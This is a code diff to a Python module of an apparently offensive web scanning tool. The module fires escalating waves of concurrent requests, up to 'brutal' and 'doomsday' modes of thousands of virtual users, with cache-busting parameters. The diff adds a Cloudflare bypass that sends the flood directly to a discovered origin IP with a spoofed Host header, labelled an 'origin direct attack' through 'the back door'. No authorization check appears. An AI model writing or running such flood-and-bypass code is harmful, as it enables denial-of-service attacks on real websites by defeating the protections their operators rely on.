@@ -31,6 +31,7 @@ Phase 4 — Crash / Degradation Detection:
 """
 
 from __future__ import annotations
+from src.export import md_table
 
 import os
 import signal
@@ -48,6 +49,7 @@ from rich.table import Table
 
 from src.config import SESSION, TIMEOUT, console, C
 from src.models import ScanResult
+from src.scoring import score_and_report
 
 # ─────────────────────────────────────────────────────────────────
 # Configuration
@@ -57,6 +59,7 @@ _WAVES: list[int] = [100, 250, 500, 1000]  # virtual users per wave
 _REQUEST_TIMEOUT: int = 10  # per-request timeout (s)
 _MAX_WORKERS: int = 200  # max concurrent threads
 _PROTECTION_PROBE_N: int = 20  # requests for rate-limit probe
+_GLOBAL_STOP_FLAG = threading.Event()
 _BRUTAL_VUS: int = 1000  # VUs locked in brutal mode
 _DOOMSDAY_VUS: int = 10000  # VUs locked in doomsday mode
 _BRUTAL_DEAD_THRESHOLD: int = 3  # consecutive 100%-error waves before auto-stop
@@ -181,12 +184,23 @@ def _detect_protection(target_url: str, waf_cdn: dict) -> dict:
 # ─────────────────────────────────────────────────────────────────
 
 
-def _fire(url: str) -> dict:
-    """Send one GET request and return timing + status."""
+def _fire(url: str, origin_ip: str | None = None, hostname: str | None = None) -> dict:
+    """Send one GET request and return timing + status.
+    If origin_ip is set, send directly to that IP with Host header (CF vhost bypass).
+    """
+    if _GLOBAL_STOP_FLAG.is_set():
+        return {"ok": False, "status": 0, "category": "aborted", "ms": 0}
     t0 = time.monotonic()
     try:
+        extra_headers = {}
+        if origin_ip and hostname:
+            extra_headers["Host"] = hostname
         resp = SESSION.get(
-            url, timeout=_REQUEST_TIMEOUT, allow_redirects=True, stream=True
+            url,
+            timeout=_REQUEST_TIMEOUT,
+            allow_redirects=True,
+            stream=True,
+            headers=extra_headers if extra_headers else None,
         )
         resp.raw.read(65536, decode_content=False)  # drain 64KB only
         resp.close()
@@ -221,10 +235,18 @@ def _fire(url: str) -> dict:
 # ─────────────────────────────────────────────────────────────────
 
 
-def _run_wave(target_url: str, vu_count: int, sitemap: list[str]) -> dict:
+def _run_wave(
+    target_url: str,
+    vu_count: int,
+    sitemap: list[str],
+    origin_ip: str | None = None,
+    hostname: str | None = None,
+) -> dict:
     """
     Fire vu_count requests concurrently.
     Each VU picks a URL: half target homepage, half random sitemap page.
+    If origin_ip is provided, requests go directly to the IP with Host header
+    (Virtual Host bypass — routes around Cloudflare to the real server).
     Returns aggregated metrics dict.
     """
     import random
@@ -234,19 +256,24 @@ def _run_wave(target_url: str, vu_count: int, sitemap: list[str]) -> dict:
     for i in range(vu_count):
         cb = "".join(random.choices(string.ascii_letters + string.digits, k=8))
 
-        if sitemap and i % 2 == 1:
+        if origin_ip:
+            # Direct-IP mode: send to the real origin, not through CF
+            base = f"http://{origin_ip}"
+        elif sitemap and i % 2 == 1:
             base = random.choice(sitemap)
         else:
             base = target_url
 
         separator = "&" if "?" in base else "?"
-        urls.append(f"{base}{separator}kvanguard_bypass={cb}")
+        urls.append((f"{base}{separator}kvanguard_bypass={cb}", origin_ip, hostname))
 
     results: list[dict] = []
     t_start = time.monotonic()
 
     with ThreadPoolExecutor(max_workers=min(_MAX_WORKERS, vu_count)) as pool:
-        for fut in as_completed({pool.submit(_fire, u): u for u in urls}):
+        for fut in as_completed(
+            {pool.submit(_fire, u[0], u[1], u[2]): u for u in urls}
+        ):
             results.append(fut.result())
 
     t_total = time.monotonic() - t_start
@@ -388,18 +415,8 @@ def _brutal_loop(
         )
     )
 
-    # Install a SIGINT handler so Ctrl+C exits cleanly instead of crashing
-    _stop_flag = threading.Event()
-
-    original_sigint = signal.getsignal(signal.SIGINT)
-
-    def _handle_sigint(sig, frame):  # noqa: ARG001
-        _stop_flag.set()
-
-    signal.signal(signal.SIGINT, _handle_sigint)
-
     try:
-        while not _stop_flag.is_set():
+        while not _GLOBAL_STOP_FLAG.is_set():
             wave_num += 1
             progress.update(
                 task,
@@ -442,9 +459,6 @@ def _brutal_loop(
 
     except KeyboardInterrupt:
         pass  # Already handled by SIGINT handler
-    finally:
-        signal.signal(signal.SIGINT, original_sigint)
-        _stop_flag.set()
 
     total_req = sum(w["total"] for w in wave_results)
     total_ok = sum(w["ok"] for w in wave_results)
@@ -465,6 +479,26 @@ def _brutal_loop(
 
 
 def run_stress(
+    target_url: str, hostname: str, result: ScanResult, progress, task
+) -> None:
+    _GLOBAL_STOP_FLAG.clear()
+    original_sigint = signal.getsignal(signal.SIGINT)
+
+    def _handle_sigint(sig, frame):  # noqa: ARG001
+        _GLOBAL_STOP_FLAG.set()
+
+    signal.signal(signal.SIGINT, _handle_sigint)
+    try:
+        _internal_run_stress(target_url, hostname, result, progress, task)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        signal.signal(signal.SIGINT, original_sigint)
+        _GLOBAL_STOP_FLAG.set()
+        score_and_report(result, "stress")
+
+
+def _internal_run_stress(
     target_url: str, hostname: str, result: ScanResult, progress, task
 ) -> None:
     """
@@ -501,7 +535,28 @@ def run_stress(
         }
 
     if protection["protected"]:
-        if brutal:
+        # ── Check if cf_bypass already found a real origin IP ────
+        cf_bypass = getattr(result, "cf_bypass_findings", {})
+        verified_origins = cf_bypass.get("verified_origins", []) if cf_bypass else []
+
+        if verified_origins:
+            origin = verified_origins[0]
+            origin_ip = origin["ip"]
+            progress.console.print(
+                Panel(
+                    f"[bold red]☁ CF DETECTED — but origin IP found via CF Bypass module![/bold red]\n\n"
+                    f"  Real Origin IP : [bold red]{origin_ip}[/bold red]\n"
+                    f"  Subdomain Leak : [cyan]{origin.get('subdomain', '?')}[/cyan]\n\n"
+                    "[bold yellow]Firing stress test DIRECTLY at origin IP with Virtual Host header.\n"
+                    "Cloudflare is being bypassed — traffic goes through the back door![/bold yellow]",
+                    title="[bold red]💀 CF BYPASS + ORIGIN DIRECT ATTACK[/bold red]",
+                    border_style="red",
+                )
+            )
+            # Inject origin_ip into result for _run_wave to pick up
+            result._stress_origin_ip = origin_ip
+            # Fall through to normal/brutal mode below — protection overridden
+        elif brutal:
             progress.console.print(
                 Panel(
                     f"[bold red]⚠ PROTECTION DETECTED — but BRUTAL mode is active.\n\n"
@@ -511,26 +566,37 @@ def run_stress(
                     border_style="yellow",
                 )
             )
+            result.stress_findings = {
+                "aborted": True,
+                "reason": protection["reason"],
+                "waves": [],
+            }
+            progress.update(task, completed=50)
+            return
         else:
             progress.console.print(
                 Panel(
                     f"[bold yellow]⚠ STRESS TEST ABORTED[/bold yellow]\n\n"
                     f"[bold]Reason:[/bold] {escape(protection['reason'])}\n\n"
                     "Target is protected by a WAF, CDN, or rate limiter.\n"
-                    "Stress testing would be ineffective and may trigger IP ban.",
+                    "Stress testing would be ineffective and may trigger IP ban.\n\n"
+                    "[dim]Tip: Run CF Bypass module first — if it finds the real origin IP,\n"
+                    "the stress test will automatically bypass Cloudflare.[/dim]",
                     title="[bold yellow]🛡 PROTECTION DETECTED — TEST SKIPPED[/bold yellow]",
                     border_style="yellow",
                 )
             )
-        result.stress_findings = {
-            "aborted": True,
-            "reason": protection["reason"],
-            "waves": [],
-        }
-        progress.update(task, completed=50)
-        return
+            result.stress_findings = {
+                "aborted": True,
+                "reason": protection["reason"],
+                "waves": [],
+            }
+            progress.update(task, completed=50)
+            return
 
     sitemap = getattr(result, "sitemap", [])
+    # Origin IP set by CF bypass integration — None means normal mode
+    _origin_ip: str | None = getattr(result, "_stress_origin_ip", None)
 
     # ── Brutal mode path
     if brutal:
@@ -571,7 +637,15 @@ def run_stress(
             completed=int((wi / total_waves) * 45) + 3,
         )
 
-        metrics = _run_wave(target_url, vu_count, sitemap)
+        if _GLOBAL_STOP_FLAG.is_set():
+            progress.console.print(
+                "  [bold yellow]⚡ STRESS TEST ENDED — USER STOPPED (Ctrl+C)[/bold yellow]"
+            )
+            break
+
+        metrics = _run_wave(
+            target_url, vu_count, sitemap, origin_ip=_origin_ip, hostname=hostname
+        )
         wave_results.append(metrics)
 
         panel, _, p99 = _wave_panel(
@@ -605,6 +679,24 @@ def run_stress(
 # ─────────────────────────────────────────────────────────────────
 # Display function
 # ─────────────────────────────────────────────────────────────────
+
+
+def score_stress(result):
+    findings = result.stress_findings
+    if not findings or findings.get("aborted"):
+        return 100
+    waves = findings.get("waves", [])
+    if not waves:
+        return 100
+    last_wave = waves[-1]
+    err_rate = last_wave.get("error_rate", 0)
+    if err_rate >= 95:
+        return 0
+    elif err_rate >= 50:
+        return 30
+    elif err_rate >= 20:
+        return 60
+    return 100
 
 
 def display_stress(result: ScanResult) -> None:
@@ -694,3 +786,59 @@ def display_stress(result: ScanResult) -> None:
             f"  [bold]Total requests fired:[/bold] [cyan]{total_req:,}[/cyan]   "
             f"[bold]Peak throughput:[/bold] [cyan]{peak_rps} req/s[/cyan] at {peak_vu} VUs\n"
         )
+
+
+def export_stress(result: ScanResult, W: callable) -> None:
+    W("### 📈 Stress Test (Load Testing)\n\n")
+    sf = result.stress_findings
+    if sf:
+        if sf.get("aborted"):
+            W(
+                f"> [!NOTE]\n> **Stress test was automatically aborted.**\n> **Reason:** {sf.get('reason', 'Unknown')}\n\n"
+            )
+        else:
+            summary = sf.get("summary", {})
+            if summary:
+                W(
+                    md_table(
+                        ["Metric", "Value"],
+                        [
+                            ["Total Waves", summary.get("total_waves", "?")],
+                            [
+                                "Total Requests",
+                                f"{summary.get('total_requests', 0):,}",
+                            ],
+                            ["Peak VUs", summary.get("peak_vus", "?")],
+                            [
+                                "Overall Error Rate",
+                                f"{summary.get('error_rate_pct', 0):.1f}%",
+                            ],
+                            [
+                                "Avg P99 Latency",
+                                f"{summary.get('avg_p99_ms', 0):.0f}ms",
+                            ],
+                            [
+                                "Max P99 Latency",
+                                f"{summary.get('max_p99_ms', 0):.0f}ms",
+                            ],
+                            ["Flags", ", ".join(sf.get("flags", [])) or "None"],
+                        ],
+                    )
+                )
+            waves = sf.get("waves", [])
+            if waves:
+                W("\n#### Wave-by-Wave Breakdown\n\n")
+                rows = [
+                    [
+                        w.get("vu_count", "?"),
+                        f"{w.get('rps', 0):.1f}",
+                        f"{w.get('error_rate', 0):.1f}%",
+                        f"{w.get('ms_p99', 0)}ms",
+                        w.get("status", "?"),
+                    ]
+                    for w in waves
+                ]
+                W(md_table(["VUs", "RPS", "Error Rate", "P99 Latency", "Status"], rows))
+    else:
+        W("- Stress test was not run.\n")
+    W("\n")
